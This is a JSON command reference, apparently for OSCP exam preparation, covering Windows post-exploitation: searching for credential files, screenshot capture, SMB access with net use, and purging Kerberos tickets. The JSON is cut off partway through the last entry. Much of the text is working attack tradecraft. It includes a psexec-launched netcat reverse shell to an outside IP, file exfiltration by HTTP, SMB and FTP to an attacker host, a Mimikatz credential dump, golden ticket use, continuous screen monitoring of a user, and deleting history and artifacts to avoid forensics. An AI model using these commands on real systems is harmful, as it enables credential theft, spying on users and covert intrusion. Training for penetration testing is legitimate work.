{
  "metadata": {
    "file_purpose": "Windows post-exploitation commands for credential hunting, situational awareness, and persistence. Essential OSCP exam techniques.",
    "oscp_relevance": "CRITICAL. After gaining initial access on Windows, these commands enable credential discovery, privilege escalation reconnaissance, and lateral movement preparation."
  },
  "commands": [
    {
      "id": "windows-search-sensitive-files",
      "name": "Search for Sensitive Files and Credentials",
      "category": "post-exploit",
      "subcategory": "credential-hunting",
      "command": "dir /s /b C:\\*password* C:\\*cred* C:\\*vnc* C:\\*.config",
      "description": "Recursively search C: drive for files containing 'password', 'cred', 'vnc', or '.config' in filename. Discovers configuration files, credential stores, and backup files containing sensitive information.",
      "variables": [],
      "flag_explanations": {
        "dir": "Windows directory listing command. With /s flag, searches recursively through all subdirectories. ALTERNATIVE: Get-ChildItem (PowerShell equivalent) with -Recurse flag.",
        "/s": "Recurse subdirectories - searches entire directory tree starting from specified paths. CRITICAL for comprehensive file discovery. Without /s, only searches current directory.",
        "/b": "Bare format - displays filenames only (no size, date, attributes). Makes output easier to parse and grep. Alternative: /a for detailed attributes.",
        "C:\\*password*": "Wildcard search for files with 'password' anywhere in filename. Examples found: passwords.txt, password_backup.xlsx, app_passwords.config. Case-insensitive on Windows.",
        "C:\\*cred*": "Search for 'cred' - finds: credentials.xml, cred.txt, stored_credentials.dat, etc.",
        "C:\\*vnc*": "VNC credential files - VNC servers store passwords in registry or .vnc files (often weakly encrypted). Examples: ultravnc.ini, vnc_config.xml.",
        "C:\\*.config": "Configuration files - often contain database connection strings, API keys, service account passwords in plaintext. Examples: web.config, app.config, hibernate.cfg.xml."
      },
      "success_indicators": [
        "List of file paths displayed",
        "Common hits: C:\\Users\\<user>\\passwords.txt, C:\\inetpub\\wwwroot\\web.config",
        "File count displayed at end",
        "No 'Access is denied' for key directories"
      ],
      "failure_indicators": [
        "Access is denied (for most system folders)",
        "File Not Found (no matches - common on clean systems)",
        "The system cannot find the path specified"
      ],
      "troubleshooting": {
        "Access is denied (many directories)": "Low privileges. Solution: Expected for system directories (C:\\Windows\\System32\\config, etc.) - skip these. Focus on user directories: dir /s /b C:\\Users\\*password*. Or elevate to SYSTEM: psexec -s -i cmd, then retry.",
        "File Not Found / no results": "No obvious credential files. Solution: Expand search terms: dir /s /b C:\\*pass* C:\\*pwd* C:\\*key* C:\\*secret* C:\\*backup*. Search specific high-value locations: C:\\Users\\, C:\\inetpub\\, C:\\Program Files\\. Use PowerShell for content search (not just filename): Get-ChildItem C:\\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password'.",
        "Too many results (thousands of files)": "Generic search terms match too much. Solution: Filter by extension: dir /s /b C:\\*.txt C:\\*.xml C:\\*.config | findstr /i password. Or search user profiles only: dir /s /b C:\\Users\\*password*.",
        "Search takes forever (hours)": "Entire C: drive scan is slow. Solution: Target specific directories: dir /s /b C:\\Users\\%USERNAME%\\*password*. Or C:\\inetpub\\wwwroot\\*.config. Or C:\\Program Files\\<AppName>\\*.xml. Skip system directories: exclude C:\\Windows\\, C:\\ProgramData\\.",
        "dir command not found (rare)": "PATH variable broken. Solution: Use full path: C:\\Windows\\System32\\cmd.exe /c dir /s /b C:\\*password*. Or use PowerShell alternative: Get-ChildItem C:\\ -Recurse -Include *password*,*cred* -ErrorAction SilentlyContinue."
      },
      "prerequisites": [],
      "next_steps": [
        "ft-file-verify-md5"
      ],
      "alternatives": [],
      "tags": [
        "WINDOWS",
        "CREDENTIAL_HUNTING",
        "FILE_SEARCH",
        "POST_EXPLOITATION",
        "OSCP:HIGH"
      ],
      "oscp_relevance": "high",
      "notes": "FIRST STEP after gaining Windows shell - hunt for low-hanging credential fruit. OSCP COMMON FINDS: (1) C:\\Users\\<user>\\passwords.txt (plain text password lists), (2) C:\\inetpub\\wwwroot\\web.config (database connection strings), (3) C:\\Program Files\\FileZilla Server\\FileZilla Server.xml (FTP credentials), (4) C:\\Users\\<user>\\AppData\\Roaming\\FileZilla\\recentservers.xml, (5) VNC password files, (6) Unattend.xml (Windows deployment credentials). Time estimate: 30 seconds - 5 minutes (depends on drive size and result count).\n\nMANUAL ALTERNATIVES:\n\nBasic credential file search:\ndir /s /b C:\\*password* C:\\*cred* C:\\*vnc* C:\\*.config\n\nExpanded search terms:\ndir /s /b C:\\*pass* C:\\*pwd* C:\\*key* C:\\*secret* C:\\*backup* C:\\*config*\n\nSearch user profiles only (faster):\ndir /s /b C:\\Users\\*password* C:\\Users\\*cred*\n\nSearch web application directories:\ndir /s /b C:\\inetpub\\wwwroot\\*.config C:\\inetpub\\wwwroot\\*.xml\ntype C:\\inetpub\\wwwroot\\web.config | findstr /i password\n\nSearch for database connection strings:\ndir /s /b C:\\*.config | xargs type | findstr /i \"connectionString\"\n\nPowerShell recursive search (filename):\nGet-ChildItem -Path C:\\ -Recurse -Include *password*,*cred*,*vnc*,*.config -ErrorAction SilentlyContinue | Select-Object FullName\n\nPowerShell content search (searches INSIDE files):\nGet-ChildItem -Path C:\\Users\\ -Recurse -Include *.txt,*.xml,*.config -ErrorAction SilentlyContinue | Select-String -Pattern \"password|credential\" -SimpleMatch\n\nHIGH-VALUE TARGET LOCATIONS:\n\n1. User profiles:\nC:\\Users\\<user>\\Desktop\\passwords.txt\nC:\\Users\\<user>\\Documents\\credentials.xlsx\nC:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt (command history)\n\n2. Web application config:\nC:\\inetpub\\wwwroot\\web.config (IIS web apps)\nC:\\xampp\\htdocs\\config.php (XAMPP)\nC:\\wamp\\www\\config.inc.php (WAMP)\n\n3. FTP server credentials:\nC:\\Program Files\\FileZilla Server\\FileZilla Server.xml\nC:\\Program Files (x86)\\FileZilla Server\\FileZilla Server.xml\nC:\\Users\\<user>\\AppData\\Roaming\\FileZilla\\recentservers.xml (client)\n\n4. VNC passwords:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\vncserver (registry)\nC:\\Program Files\\RealVNC\\VNC Server\\config.txt\nC:\\Program Files\\UltraVNC\\ultravnc.ini\n\n5. Database connection strings:\nC:\\Program Files\\<AppName>\\app.config\nC:\\Windows\\System32\\inetsrv\\config\\applicationHost.config (IIS)\n\n6. Windows deployment credentials:\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattended.xml\nC:\\Windows\\system32\\sysprep\\Unattend.xml\n\n7. Backup files:\nC:\\Backup\\*.zip\nC:\\Users\\<user>\\Documents\\backup*.rar\nC:\\Windows\\System32\\config\\RegBack\\SAM (registry backups)\n\n8. SSH keys:\nC:\\Users\\<user>\\.ssh\\id_rsa\nC:\\Users\\<user>\\.ssh\\id_rsa.pub\n\n9. Git credentials:\nC:\\Users\\<user>\\.git-credentials\nC:\\<project>\\.git\\config\n\n10. PowerShell history:\nC:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\ntype (Get-PSReadlineOption).HistorySavePath\n\nSPECIFIC FILE SEARCHES:\n\nUnattend.xml (auto-deployment credentials):\ndir /s /b C:\\*unattend.xml C:\\*unattended.xml\ntype C:\\Windows\\Panther\\Unattend.xml | findstr /i password\n\nPowerShell history (command history):\ntype %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n# Often contains: net use commands with passwords, psexec with credentials, etc.\n\nWeb.config (database passwords):\ntype C:\\inetpub\\wwwroot\\web.config\nfindstr /si password C:\\inetpub\\wwwroot\\*.config\n\nSAM backup (registry hives):\ndir /s /b C:\\Windows\\repair\\SAM C:\\Windows\\System32\\config\\RegBack\\SAM\n# If found, extract with impacket-secretsdump\n\nFileZilla credentials:\ntype \"C:\\Program Files\\FileZilla Server\\FileZilla Server.xml\"\ntype \"%APPDATA%\\FileZilla\\recentservers.xml\"\n\nEXTRACTING CREDENTIALS FROM CONFIG FILES:\n\nWeb.config connection strings:\n<connectionStrings>\n  <add name=\"DefaultConnection\" connectionString=\"Server=localhost;Database=myDB;User Id=sa;Password=P@ssw0rd123;\" />\n</connectionStrings>\n\nUnattend.xml local admin password:\n<UserAccounts>\n  <LocalAccounts>\n    <LocalAccount wcm:action=\"add\">\n      <Password>\n        <Value>UABhAHMAcwB3AG8AcgBkADEAMgAzACEA</Value>\n        <PlainText>false</PlainText>\n      </Password>\n      <Name>Administrator</Name>\n    </LocalAccount>\n  </LocalAccounts>\n</UserAccounts>\n# Base64 decode: echo UABhAHMAcwB3AG8AcgBkADEAMgAzACEA | base64 -d\n\nFinal Recommendations:\n1. Start with user profiles: C:\\Users\\*password*\n2. Check web apps: C:\\inetpub\\wwwroot\\*.config\n3. PowerShell history: ConsoleHost_history.txt\n4. Unattend.xml: C:\\Windows\\Panther\\Unattend.xml\n5. FileZilla: C:\\Program Files\\FileZilla Server\\FileZilla Server.xml\n6. Registry backups: C:\\Windows\\repair\\SAM\n\nTIME ESTIMATE:\nUser profiles search: 30 seconds - 2 minutes\nFull C: drive search: 5-30 minutes (not recommended)\nTargeted searches (specific directories): 10-60 seconds each"
    },
    {
      "id": "windows-screenshot-capture",
      "name": "Capture Screenshot (RDP/GUI Session)",
      "category": "post-exploit",
      "subcategory": "situational-awareness",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\\Temp\\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose()\"",
      "description": "Capture screenshot of current desktop session. Useful for documenting GUI-based findings, reading sensitive information displayed on screen, or proving access during engagements.",
      "variables": [],
      "flag_explanations": {
        "Add-Type -AssemblyName System.Windows.Forms": "Load .NET Windows Forms library for screen access. Provides Screen class to get display information.",
        "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds": "Get primary monitor dimensions (width, height, position). For multi-monitor, captures only primary display.",
        "New-Object System.Drawing.Bitmap": "Create in-memory bitmap image object with screen dimensions. Image stored in RAM before saving to disk.",
        "$graphics.CopyFromScreen()": "Capture screen content into bitmap. Copies pixel data from display buffer. Requires active desktop session (doesn't work over SSH/WinRM, only RDP/console).",
        "$bitmap.Save('C:\\\\Temp\\\\screenshot.png')": "Save bitmap to PNG file. Can use any writable directory. PNG format provides good compression without quality loss. Alternative formats: JPEG (smaller file), BMP (larger file).",
        "C:\\\\Temp\\\\screenshot.png": "Output file path. Use writable directory like C:\\Temp\\, C:\\Users\\Public\\, or %TEMP%. OPSEC: Delete after exfiltration."
      },
      "success_indicators": [
        "No errors displayed",
        "File created: C:\\Temp\\screenshot.png",
        "File size: 100KB - 5MB (depends on resolution)",
        "Image opens successfully and shows desktop",
        "Can transfer file to Kali for viewing"
      ],
      "failure_indicators": [
        "No desktop session detected",
        "Access to the path is denied",
        "Exception calling CopyFromScreen",
        "System.NotSupportedException",
        "The term 'Add-Type' is not recognized"
      ],
      "troubleshooting": {
        "No desktop session detected": "No active GUI session. Solution: Screenshot requires interactive session (RDP, console, VNC). Doesn't work over: WinRM, SSH, PSExec without -i flag, WMIExec. Use RDP: xfreerdp /u:<user> /p:<pass> /v:<target>. Or PSExec with interaction: psexec.exe -i -s cmd (launches interactive session).",
        "Access to the path is denied": "Cannot write to C:\\Temp\\. Solution: Use alternate writable directory: %TEMP%\\screenshot.png (user temp), C:\\Users\\Public\\screenshot.png (public folder), %APPDATA%\\screenshot.png (user AppData). Or create temp directory: mkdir C:\\Temp && (save screenshot).",
        "Exception calling CopyFromScreen": "Graphics driver issue or RDP session not fully initialized. Solution: Retry command. Wait 5-10 seconds after RDP connection. Or use alternate tool: nircmd.exe savescreenshot screenshot.png (NirSoft utility).",
        "PowerShell version too old": "PowerShell 2.0 may have issues. Solution: Upgrade PowerShell (if possible) or use alternate method: nircmd.exe, Windows Snipping Tool automation, or VBScript screenshot.",
        "Bitmap.Save fails with ArgumentException": "Invalid file path or permissions. Solution: Use simple path without spaces: C:\\screenshot.png. Or ensure directory exists: New-Item -Path C:\\Temp\\ -ItemType Directory -Force; (save screenshot)."
      },
      "prerequisites": [],
      "next_steps": [
        "windows-smb-exfiltrate-file"
      ],
      "alternatives": [],
      "tags": [
        "WINDOWS",
        "SCREENSHOT",
        "POWERSHELL",
        "DOCUMENTATION",
        "OSCP:MEDIUM"
      ],
      "oscp_relevance": "medium",
      "notes": "USEFUL FOR DOCUMENTATION and discovering GUI-based secrets. OSCP USE CASES: (1) Capture proof.txt contents displayed on desktop, (2) Document application GUI settings revealing credentials, (3) Screenshot password manager vaults, (4) Capture Sticky Notes with passwords. REQUIREMENTS: Active desktop session (RDP, console, or VNC) - doesn't work over SSH/WinRM/PSExec without -i. File size: ~1-5MB for typical resolution. OPSEC: Delete screenshot after exfiltration to avoid leaving forensic artifacts. Time estimate: 2-5 seconds (capture + save).\n\nMANUAL ALTERNATIVES:\n\nFull PowerShell one-liner:\npowershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\\Temp\\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose()\"\n\nSave to user temp (more stealthy):\npowershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('$env:TEMP\\s.png', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose()\"\n\nJPEG format (smaller file size):\npowershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\\screenshot.jpg', [System.Drawing.Imaging.ImageFormat]::Jpeg); $bitmap.Dispose(); $graphics.Dispose()\"\n\nNirCmd alternative (smaller executable):\nnircmd.exe savescreenshot C:\\screenshot.png\n# Download nircmd.exe from NirSoft: https://www.nirsoft.net/utils/nircmd.html\n\nSnipping Tool automation (Windows built-in):\n%windir%\\System32\\SnippingTool.exe /clip\n# Copies screenshot to clipboard - paste into Paint and save\n\nPowerShell script file (for repeated captures):\n# screenshot.ps1\nAdd-Type -AssemblyName System.Windows.Forms\nAdd-Type -AssemblyName System.Drawing\n\n$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds\n$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)\n$graphics = [System.Drawing.Graphics]::FromImage($bitmap)\n\n$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)\n\n$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'\n$filename = \"screenshot_$timestamp.png\"\n$bitmap.Save(\"C:\\Temp\\$filename\", [System.Drawing.Imaging.ImageFormat]::Png)\n\n$bitmap.Dispose()\n$graphics.Dispose()\n\nWrite-Host \"Screenshot saved: C:\\Temp\\$filename\"\n\nExecute: powershell -ExecutionPolicy Bypass -File screenshot.ps1\n\nMultiple monitor capture (all screens):\npowershell -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bitmap.Save('C:\\Temp\\screenshot_all.png'); $bitmap.Dispose(); $graphics.Dispose()\"\n\nContinuous monitoring (take screenshot every 30 seconds):\nwhile ($true) {\n  $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'\n  # (screenshot capture code)\n  Start-Sleep -Seconds 30\n}\n\nFILE TRANSFER AFTER CAPTURE:\n\nSMB transfer:\ncopy C:\\Temp\\screenshot.png \\\\<LHOST>\\share\\\n\nHTTP upload (PowerShell):\nInvoke-WebRequest -Uri http://<LHOST>:8080/upload -Method POST -InFile C:\\Temp\\screenshot.png\n\nBase64 encode and paste:\n[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Temp\\screenshot.png')) | Out-File C:\\Temp\\screenshot.txt\ntype C:\\Temp\\screenshot.txt\n# Copy output, decode on Kali: base64 -d > screenshot.png\n\nFTP upload:\necho open <LHOST> > ftp.txt\necho user anonymous anonymous >> ftp.txt\necho binary >> ftp.txt\necho put C:\\Temp\\screenshot.png >> ftp.txt\necho bye >> ftp.txt\nftp -s:ftp.txt\n\nUSE CASES:\n\n1. Proof of access:\n- Screenshot desktop showing machine name + proof.txt contents\n- For OSCP: ipconfig /all + type proof.txt in same window\n\n2. Password managers:\n- Open KeePass, LastPass, 1Password GUI → screenshot\n- Often reveals master password or stored credentials\n\n3. Sticky Notes:\n- Windows Sticky Notes often contain passwords\n- Screenshot desktop if notes visible\n\n4. Application credentials:\n- Database management tools (SQL Server Mgmt Studio, MySQL Workbench)\n- FTP clients (FileZilla, WinSCP) showing saved sessions\n- Email clients with credential cache\n\n5. Browser saved passwords:\n- Open browser password manager → screenshot\n- Chrome: chrome://settings/passwords\n- Firefox: about:logins\n\n6. Ongoing user activity:\n- Monitor what user is currently doing\n- Capture sensitive documents being edited\n- Identify applications in use (exploit research targets)\n\nCLEANUP:\n\nDelete screenshot after exfiltration:\ndel C:\\Temp\\screenshot.png\n\nClear PowerShell history:\nRemove-Item (Get-PSReadlineOption).HistorySavePath\n\nTIME ESTIMATE:\nScreenshot capture: 1-2 seconds\nFile save: <1 second\nFile transfer (SMB): 2-10 seconds (depends on size and connection)\nTotal: 3-13 seconds"
    },
    {
      "id": "windows-net-use-smb-connect",
      "name": "Map Network Drive with net use",
      "category": "post-exploit",
      "subcategory": "lateral-movement",
      "command": "net use \\\\<TARGET>\\<SHARE> /user:<DOMAIN>\\<USERNAME> <PASSWORD>",
      "description": "Authenticate to remote SMB share and map network drive. Used to access remote file systems after credential discovery or for Golden Ticket validation.",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP address",
          "example": "DC1.corp.com",
          "required": true
        },
        {
          "name": "<SHARE>",
          "description": "Share name (e.g., C$, ADMIN$, SYSVOL, custom shares)",
          "example": "C$",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain name (use '.' for local account)",
          "example": "CORP",
          "required": true
        },
        {
          "name": "<USERNAME>",
          "description": "Username for authentication",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASSWORD>",
          "description": "Password for authentication",
          "example": "P@ssw0rd!",
          "required": true
        }
      ],
      "flag_explanations": {
        "net use": "Windows network resource connection command. Creates authenticated SMB session to remote share. CRITICAL: Credentials cached in LSASS after successful connection (can be dumped with Mimikatz). Alternative: New-PSDrive (PowerShell), pushd (temporary mapping).",
        "\\\\\\\\<TARGET>\\\\<SHARE>": "UNC path to remote share. FORMAT: \\\\\\\\hostname\\sharename. Common shares: C$ (admin share for C: drive), ADMIN$ (C:\\Windows), IPC$ (inter-process communication), SYSVOL (domain shares), NETLOGON (logon scripts). Custom shares: \\\\\\\\server\\Data, \\\\\\\\server\\Backup, etc.",
        "/user:<DOMAIN>\\\\<USERNAME>": "Authentication credentials. FORMAT: DOMAIN\\username or .\\username (local). Examples: /user:CORP\\administrator (domain admin), /user:.\\administrator (local admin), /user:CORP.COM\\user@corp.com (UPN format).",
        "<PASSWORD>": "Plaintext password. OPSEC WARNING: Password appears in command line (logged in Event ID 4688, visible in process list). For stealth, use PowerShell SecureString or runas /netonly.",
        "Optional: /persistent:no": "Don't persist connection after reboot. Default: /persistent:yes (reconnects at logon). Use /persistent:no for temporary connections during engagement.",
        "Optional: <DRIVE_LETTER>:": "Assign drive letter. Example: net use Z: \\\\\\\\<TARGET>\\C$ /user:<USER> <PASS>. Access as Z:\\ instead of full UNC path. Useful for scripts expecting drive letters."
      },
      "success_indicators": [
        "Output: 'The command completed successfully.'",
        "Can access share: dir \\\\\\\\<TARGET>\\\\<SHARE>",
        "net use shows connection in list",
        "Files accessible on remote share"
      ],
      "failure_indicators": [
        "System error 5 - Access is denied",
        "System error 53 - Network path was not found",
        "System error 1326 - Logon failure: unknown user name or bad password",
        "System error 1219 - Multiple connections to a server not allowed",
        "The password is incorrect"
      ],
      "troubleshooting": {
        "System error 5 (Access denied)": "User lacks permissions for share. Solution: Verify credentials with crackmapexec: crackmapexec smb <TARGET> -u <USER> -p <PASS>. Check share permissions: net share (on target). Try different share: net use \\\\\\\\<TARGET>\\IPC$ instead of C$. Verify admin rights: net localgroup administrators (on target).",
        "System error 53 (Network path not found)": "Cannot reach target or share doesn't exist. Solution: Ping target: ping <TARGET>. Verify SMB port: nmap -p 445 <TARGET>. List available shares: net view \\\\\\\\<TARGET>. Check DNS resolution: nslookup <TARGET>. Try IP instead of hostname.",
        "System error 1326 (Bad username/password)": "Invalid credentials. Solution: Verify password case sensitivity. Try domain formats: DOMAIN\\user vs user@domain.com. Test with smbclient: smbclient -L //<TARGET> -U <DOMAIN>/<USER>%<PASS>. Check account not locked: crackmapexec smb <TARGET> -u <USER> -p '' (check if account exists).",
        "System error 1219 (Multiple connections)": "Already connected to target with different credentials. Solution: Disconnect existing connections: net use \\\\\\\\<TARGET> /delete. List all connections: net use. Disconnect all: net use * /delete /y. Then retry connection.",
        "Special characters in password break command": "Command line parsing issues. Solution: Use PowerShell alternative: $pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\\<USER>', $pass); New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\\\\\<TARGET>\\C$ -Credential $cred"
      },
      "prerequisites": [],
      "next_steps": [],
      "alternatives": [
        "pushd \\\\\\\\<TARGET>\\\\<SHARE> (temporary mapping, auto-disconnects)",
        "New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\\\\\<TARGET>\\\\<SHARE> -Credential $cred (PowerShell)"
      ],
      "tags": [
        "WINDOWS",
        "SMB",
        "LATERAL_MOVEMENT",
        "NETWORK_DRIVE",
        "OSCP:MEDIUM"
      ],
      "oscp_relevance": "medium",
      "notes": "COMMON POST-EXPLOITATION task for file access and Golden Ticket validation. OSCP USE CASES: (1) Access remote C$ share after discovering credentials, (2) Validate Golden Ticket works: net use \\\\\\\\DC1\\C$ (with ticket loaded), (3) Browse file shares for sensitive files, (4) Copy exploit tools to remote systems. OPSEC WARNING: Password in command line logged in Event ID 4688 and visible in process monitor. Use PowerShell SecureString for stealth. Credentials cached in LSASS after successful connection (extractable with Mimikatz). Time estimate: 2-5 seconds.\n\nMANUAL ALTERNATIVES:\n\nBasic connection:\nnet use \\\\\\\\<TARGET>\\C$ /user:CORP\\administrator P@ssw0rd!\n\nWith drive letter mapping:\nnet use Z: \\\\\\\\<TARGET>\\C$ /user:CORP\\administrator P@ssw0rd!\ndir Z:\\\n\nTemporary connection (no persistence):\nnet use \\\\\\\\<TARGET>\\C$ /user:CORP\\administrator P@ssw0rd! /persistent:no\n\nLocal account authentication:\nnet use \\\\\\\\<TARGET>\\C$ /user:.\\administrator P@ssw0rd!\n\nList all network connections:\nnet use\n\nDisconnect specific share:\nnet use \\\\\\\\<TARGET>\\C$ /delete\n\nDisconnect all shares:\nnet use * /delete /y\n\nPowerShell (more secure - no password in command line):\n$pass = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('CORP\\administrator', $pass)\nNew-PSDrive -Name Z -PSProvider FileSystem -Root \\\\\\\\<TARGET>\\C$ -Credential $cred\n\nPushd (temporary mapping, auto-unmounts when popd):\npushd \\\\\\\\<TARGET>\\C$\ndir\npopd\n\nAccess without mapping (direct UNC):\ndir \\\\\\\\<TARGET>\\C$\\Users\ntype \\\\\\\\<TARGET>\\C$\\Users\\Administrator\\Desktop\\proof.txt\n\nCOMMON SMB SHARES:\n\nAdmin shares (require admin rights):\nC$ - C: drive root\nADMIN$ - C:\\Windows\nIPC$ - Inter-process communication (null session testing)\n\nDomain shares:\nSYSVOL - Domain Group Policy and scripts (\\\\\\\\DC\\SYSVOL\\<domain>\\)\nNETLOGON - User logon scripts (\\\\\\\\DC\\NETLOGON)\n\nCustom shares:\nnet view \\\\\\\\<TARGET> (list available shares)\nnet share (on target - list local shares)\n\nGOLDEN TICKET VALIDATION:\n\n1. Create Golden Ticket with Mimikatz/ticketer.py\n2. Load ticket: klist purge && klist add ticket.kirbi (Mimikatz) OR export KRB5CCNAME=ticket.ccache (Linux)\n3. Test access: net use \\\\\\\\DC1.corp.com\\C$\n4. Should succeed WITHOUT /user and password flags (Kerberos auth)\n\nFILE OPERATIONS AFTER CONNECTION:\n\nList files:\ndir \\\\\\\\<TARGET>\\C$\\Users\\Administrator\\Desktop\\\n\nCopy file from target:\ncopy \\\\\\\\<TARGET>\\C$\\Users\\Administrator\\Desktop\\proof.txt C:\\proof.txt\n\nCopy file to target:\ncopy nc.exe \\\\\\\\<TARGET>\\C$\\Windows\\Temp\\\n\nExecute remote binary (with psexec):\npsexec \\\\\\\\<TARGET> -u <DOMAIN>\\<USER> -p <PASS> cmd /c \"C:\\Windows\\Temp\\nc.exe -e cmd 10.10.14.5 4444\"\n\nSearch remote files:\ndir /s /b \\\\\\\\<TARGET>\\C$\\*password*\n\nMOUNT VS DIRECT ACCESS:\n\nMount (with drive letter):\nnet use Z: \\\\\\\\<TARGET>\\C$\ndir Z:\\Users\ncopy Z:\\Users\\admin\\passwords.txt C:\\\n\nDirect UNC access (no drive letter):\ndir \\\\\\\\<TARGET>\\C$\\Users\ncopy \\\\\\\\<TARGET>\\C$\\Users\\admin\\passwords.txt C:\\\n\nDirect access advantages:\n- No drive letter required\n- Less suspicious (no registry changes)\n- Works in scripts without mount/unmount\n\nDrive letter advantages:\n- Some tools require drive letters (not UNC paths)\n- Easier for repetitive access\n- Tab completion in cmd.exe\n\nCREDENTIAL CACHING:\n\nAfter net use, credentials stored in:\n1. LSASS process memory (extract with Mimikatz)\n2. Windows Credential Manager: rundll32.exe keymgr.dll,KRShowKeyMgr\n3. Registry: HKCU\\Network (mapped drives)\n\nExtract cached credentials:\nmimikatz.exe \"sekurlsa::logonpasswords\" \"exit\"\n# Shows credentials used for net use connections\n\nCLEANUP:\n\nDisconnect share:\nnet use \\\\\\\\<TARGET>\\C$ /delete\n\nClear stored credentials:\ncmdkey /delete:<TARGET>\ncontrol userpasswords2 (GUI cleanup)\n\nClear PowerShell history:\nRemove-Item (Get-PSReadlineOption).HistorySavePath\n\nTIME ESTIMATE:\nConnection: 2-5 seconds\nFile listing: 1-2 seconds\nFile transfer: Variable (depends on size)"
    },
    {
      "id": "kerberos-klist-purge",
      "name": "Clear Kerberos Ticket Cache",
      "category": "post-exploit",
      "subcategory": "kerberos",
      "command": "klist purge",
      "description": "Delete all Kerberos tickets from current user's ticket cache. Used to clear old tickets before loading Golden/Silver tickets or to reset authentication state.",
      "variables": [],
      "flag_explanations": {
        "klist": "Windows Kerberos ticket list and management utility. Built-in Windows tool (no installation required). Shows current Kerberos TGTs (Ticket Granting Tickets) and TGSs (Service Tickets) in user's credential cache.",
        "purge": "Delete ALL Kerberos tickets from current session. Clears both TGTs and TGSs. CRITICAL before loading Golden/Silver tickets - ensures old tickets don't interfere. Equivalent to Linux: kdestroy or Mimikatz: kerberos::purge."
      },
      "success_indicators": [
        "Output: 'Ticket(s) purged!'",
        "klist shows no cached tickets",
        "Output: 'Current LogonId is 0:0xXXXXX' with no ticket list",
        "Kerberos authentication fails (expected after purge - no valid tickets)"
      ],
      "failure_indicators": [
        "klist: command not found (extremely rare - built into Windows)",
        "Access is denied (insufficient privileges - shouldn't happen for purge)",
        "No tickets in cache (not an error - already empty)"
      ],
      "troubleshooting": {
        "klist command not found": "Windows path issue (extremely rare). Solution: Use full path: C:\\Windows\\System32\\klist.exe purge. Verify Windows version: klist is built into Windows 2000+. If truly missing, use Mimikatz alternative: mimikatz.exe 'kerberos::purge' exit.",
        "Tickets still present after purge": "May have system-level tickets or protected tickets. Solution: Run from elevated prompt: Run as Administrator → klist purge. Or use Mimikatz with privilege::debug: mimikatz.exe 'privilege::debug' 'kerberos::purge' 'exit'.",
        "Cannot purge specific ticket": "klist purge deletes ALL tickets - no selective deletion in Windows klist. Solution: For selective deletion, use Mimikatz: mimikatz.exe 'kerberos::list' (note ticket ID) 'kerberos::purge /ticket:<ID>' 'exit'. Or Rubeus: Rubeus.exe purge /luid:<LUID>."
      },
      "prerequisites": [],
      "next_steps": [
        "ad-golden-ticket-mimikatz-create"
      ],
      "alternatives": [
        "mimikatz.exe \"kerberos::purge\" \"exit\" (Mimikatz alternative)",
        "Rubeus.exe purge (Rubeus alternative)"
      ],
      "tags": [
        "KERBEROS",
        "TICKET_MANAGEMENT",
        "WINDOWS",
        "GOLDEN_TICKET",
        "SILVER_TICKET",
        "OSCP:MEDIUM"
      ],
      "oscp_relevance": "medium",
